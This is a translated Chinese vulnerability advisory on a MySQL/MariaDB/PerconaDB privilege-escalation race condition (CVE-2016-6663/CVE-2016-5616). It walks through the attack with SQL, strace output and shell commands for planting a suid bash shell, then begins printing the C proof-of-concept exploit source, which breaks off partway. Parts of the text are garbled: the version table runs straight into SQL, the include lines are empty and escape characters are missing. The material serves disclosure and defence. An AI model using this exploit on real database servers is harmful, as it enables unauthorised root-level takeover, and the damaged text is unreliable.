# 【漏洞预警】MySQL / MariaDB / PerconaDB - 提权/条件竞争漏洞(11.4日视频已更新)(附POC)
|
##### 译文声明
本文是翻译文章，文章来源：安全客
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
**  
**
**漏洞发现人：Dawid Golunski**
**漏洞级别：严重**
**CVE编号 ：CVE-2016-6663 / CVE-2016-5616**
**漏洞影响：**
MariaDB  |  CREATE TABLE poctab1 (txt varchar(50)) engine = 'MyISAM' data directory '/tmp/disktable';
执行完成后，查看下目录权限，变为mysql
    attacker@debian:~$ ls -l /tmp/disktable/
    total 0
    -rw-rw---- 1 mysql mysql 0 Oct 28 10:53 poctab1.MYD
低权限（SELECT/CREATE/INSERT权限）的MYSQL账户，在执行表修复过程中，执行了不安全的临时文件创建。
    mysql> REPAIR TABLE `poctab1`;
    +----------------+--------+----------+----------+
    | Table          | Op     | Msg_type | Msg_text |
    +----------------+--------+----------+----------+
    | testdb.poctab1 | repair | status   | OK       |
    +----------------+--------+----------+----------+
通过查看系统调用，可以看到
    [pid  1463] lstat("/tmp/disktable/poctab1.MYD", {st_mode=S_IFREG|0660, st_size=0, ...}) = 0
    [pid  1463] open("/tmp/disktable/poctab1.MYD", O_RDWR) = 65
    [pid  1463] access("./testdb/poctab1.TRG", F_OK) = -1 ENOENT (No such file or directory)
    [pid  1463] lseek(65, 0, SEEK_CUR)      = 0
    [pid  1463] lseek(65, 0, SEEK_END)      = 0
    [pid  1463] mprotect(0x7f6a3804f000, 12288, PROT_READ|PROT_WRITE) = 0
    [pid  1463] open("/tmp/disktable/poctab1.TMD", O_RDWR|O_CREAT|O_EXCL|O_TRUNC, 0660) = 66
    [pid  1463] lseek(65, 0, SEEK_END)      = 0
    [pid  1463] lseek(64, 0, SEEK_END)      = 1024
    [pid  1463] close(65)                   = 0
    [pid  1463] close(66)                   = 0
    [pid  1463] lstat("/tmp", {st_mode=S_IFDIR|S_ISVTX|0777, st_size=4096, ...}) = 0
    [pid  1463] lstat("/tmp/disktable", {st_mode=S_IFDIR|0777, st_size=4096, ...}) = 0
    [pid  1463] lstat("/tmp/disktable/poctab1.MYD", {st_mode=S_IFREG|0660, st_size=0, ...}) = 0
    [pid  1463] stat("/tmp/disktable/poctab1.MYD", {st_mode=S_IFREG|0660, st_size=0, ...}) = 0
    [pid  1463] chmod("/tmp/disktable/poctab1.TMD", 0660) = 0
    [pid  1463] chown("/tmp/disktable/poctab1.TMD", 110, 115) = 0
    [pid  1463] unlink("/tmp/disktable/poctab1.MYD") = 0
    [pid  1463] rename("/tmp/disktable/poctab1.TMD", "/tmp/disktable/poctab1.MYD") = 0
第一个系统调用是
    [pid  1463] lstat("/tmp/disktable/poctab1.MYD", {st_mode=S_IFREG|0660, st_size=0, ...}) = 0
我们可以看到，在检验poctab1.MYD表文件权限的时候，也会复制在创建repaired表时的临时文件chmod()权限。因此在
    [pid  1463] lstat("/tmp/disktable/poctab1.MYD", {st_mode=S_IFREG|0660, st_size=0, ...}) = 0
和
    [pid  1463] chmod("/tmp/disktable/poctab1.TMD", 0660) = 0
系统调用之间，产生了条件竞争漏洞。
如果攻击者删除临时表poctab1.TMD，然后通过符号链接在chmod()操作前替换/var/lib/mysql，则能够完全控制MYSQL的data目录权限。
攻击者可以预设置poctab1.MYD权限为04777(suid)，然后通过有漏洞的chmod()调用有效的复制一个bash
shell来执行命令。这里会有一个问题，suid shell将只会保留攻击者的UID，而不是'mysql'用户。因此攻击者需要复制bash
shell到mysql用户用户的表文件，然而mysql表文件又不具有写权限。
可以通过新建一个具有组粘帖位（group sticky bit)的目录来绕过这个限制
新建/tmp/disktable/目录，并赋予组粘帖位（group sticky bit)
    attacker@debian:/tmp/disktable$ chmod g+s /tmp/disktable/
    attacker@debian:/tmp/disktable$ ls -ld /tmp/disktable/
    drwxrwsrwx 2 attacker attacker 4096 Oct 28 11:25 /tmp/disktable/
通过data directory参数指定存储目录为/tmp/disktable/
    mysql> CREATE TABLE poctab2 (txt varchar(50)) engine = 'MyISAM' data directory '/tmp/disktable';
    Query OK, 0 rows affected (0.00 sec)
再次查看/tmp/disktable/权限
    attacker@debian:/tmp/disktable$ ls -l /tmp/disktable/
    total 0
    -rw-rw---- 1 mysql mysql    0 Oct 28 11:04 poctab1.MYD
    -rw-rw---- 1 mysql attacker 0 Oct 28 11:34 poctab2.MYD
我们可以看到poctab2.MYD表已经是'mysql'权限了，但是属于'attacker'组。这样'attacker'就能够复制/bin/bash到poctab2.MYD文件了。
**漏洞验证：**
**POC.**
    ------------------[ mysql-privesc-race.c ]--------------------    /*
    MySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploit
    mysql-privesc-race.c (ver. 1.0)
    CVE-2016-6663 / OCVE-2016-5616
    Discovered/Coded by:
    Dawid Golunski
    dawid[at]legalhackers.com
    @dawid_golunski
    http://legalhackers.com
    Compile:
    gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient
    Note:
    * On RedHat-based systems you might need to change /tmp to another public directory
    * For testing purposes only. Do no harm.  
    Full advisory URL:
    http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html
    */
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define EXP_PATH          "/tmp/mysql_privesc_exploit"
    #define EXP_DIRN          "mysql_privesc_exploit"
    #define MYSQL_TAB_FILE    EXP_PATH "/exploit_table.MYD"
    #define MYSQL_TEMP_FILE   EXP_PATH "/exploit_table.TMD"
    #define SUID_SHELL     EXP_PATH "/mysql_suid_shell.MYD"
    #define MAX_DELAY 1000    // can be used in the race to adjust the timing if necessary
    MYSQL *conn;  // DB handles
    MYSQL_RES *res;
    MYSQL_ROW row;
    unsigned long cnt;
    void intro() {
    printf( 
            "33[94mn"
            "MySQL/PerconaDB/MariaDB - Privilege Escalation / Race Condition PoC Exploitn"
            "mysql-privesc-race.c (ver. 1.0)nn"
            "CVE-2016-6663 / OCVE-2016-5616nn"
            "For testing purposes only. Do no harm.nn"
    "Discovered/Coded by:nn"
    "Dawid Golunski n"
    "http://legalhackers.com"
            "33[0mnn");
    }
    void usage(char *argv0) {
        intro();
        printf("Usage:nn%s user pass db_host databasenn", argv0);
    }
    void mysql_cmd(char *sql_cmd, int silent) {
        if (!silent) {
        printf("%s n", sql_cmd);
        }
        if (mysql_query(conn, sql_cmd)) {
            fprintf(stderr, "%sn", mysql_error(conn));
            exit(1);